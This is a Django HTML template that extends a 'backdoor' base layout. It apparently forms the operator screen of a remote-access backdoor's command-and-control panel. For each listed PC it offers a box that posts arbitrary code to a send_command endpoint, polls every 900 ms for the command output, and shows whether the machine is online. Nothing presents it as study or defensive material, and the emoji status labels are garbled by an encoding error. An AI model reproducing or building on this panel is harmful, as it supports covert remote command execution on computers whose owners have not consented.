{% include 'backdoor/base.html' %}
{% block content %}
<div style="padding:15px;">
    <h1>{{pc.pc_name}}</h1>
    <div id="online-status-{{pc.id}}" class="offline">âšª Checking</div>
    <div class="mb-3">
        <textarea class="form-control" id="exampleFormControlTextarea1" style="border:1px solid;" rows="10"></textarea>
    </div>
        <div class="mb-3">
            <textarea class="form-control" id="code" name="code" rows="10" style="border:1px solid;"></textarea>
        </div>
        <button onclick="send_command()" class="btn btn-primary">Send</button>
        <a href="{% url 'clean' pc.id %}"><button type="button" class="btn btn-dark">Clear</button></a>
    <script>
        function send_command(){
            $.ajax({
                type: 'POST',
                url : "{% url 'send_command' pc.id %}",
                data: {
                    'code': $('#code').val()
                  },
                success: function(response){
                    document.getElementById("code").value = "";
                },
                error: function(response)
                {
                    console.log("b");
                }
            });
        }
    </script>
    <script>$(document).ready(function(){
        setInterval(function(){
            $.ajax({
                type:'GET',
                url : "{% url 'ajax' pc.id %}",
                success: function(response){
                    console.log(response.data);
                    document.getElementById("exampleFormControlTextarea1").value = response.data; 
                    var $textarea = $('#exampleFormControlTextarea1');
                    $textarea.scrollTop($textarea[0].scrollHeight);     
                },
                error: function(response)
                {
                    console.log("b");
                }
            });
        },900);
    });</script>
    <script>$(document).ready(function(){
        setInterval(function(){
            $.ajax({
                type:'GET',
                url : "{% url 'ajax-pc' pc.id %}",
                success: function(response){
                    let element = document.getElementById("online-status-{{pc.id}}")
                    if(response.data == "online")
                    {
                        element.innerText = "ðŸŸ¢ Online"
                        element.style.color = "green"
                    }
                    else {
                        element.innerText = "ðŸ”´ Offline"
                        element.style.color = "rgb(255,0,0)"
                    }             
                },
                error: function(response)
                {
                    console.log("b");
                }
            });
        },900);
    });</script>

</div>
{% endblock content %}